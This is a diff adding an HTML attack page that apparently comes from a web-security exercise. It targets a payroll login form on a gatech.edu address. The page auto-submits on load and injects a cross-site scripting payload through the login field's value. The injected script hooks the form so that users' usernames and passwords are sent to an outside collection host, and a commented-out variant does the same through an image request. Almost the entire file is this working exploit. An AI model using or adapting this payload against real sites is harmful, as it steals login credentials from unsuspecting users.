@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<!--the vulnerable code is in index.php, specifically in the value field of the login input element where the attacker than execute arbitrary javascript and steal login credentials
+-->
+<html>
+<body onload='document.forms[0].submit()'>
+<form action='http://payroll.gatech.edu/index.php' onsubmit='' method='POST'>
+	<input type='hidden' name='login' value='"/><script>function test(){return $.ajax({type: "GET", url: "http://hackmail.org/sendmail.php?" + "&username=H4x0r." + "&payload=" + document.getElementsByName("login")[0].value + " " + document.getElementsByName("pw")[0].value + "&random=" + Math.random(), async: false});}; document.forms[0].setAttribute("onsubmit", "return test();");</script><br class="'/>
+</form>
+</body>
+</html>
+
+<!-- window.location = javascript:void((new Image()).src="http://hackmail.org/sendmail.php?" + "&username=H4x0r." + "&payload=" + document.getElementsByName("login")[0].value + " " + document.getElementsByName("pw")[0].value + "&random=" + Math.random()); -->
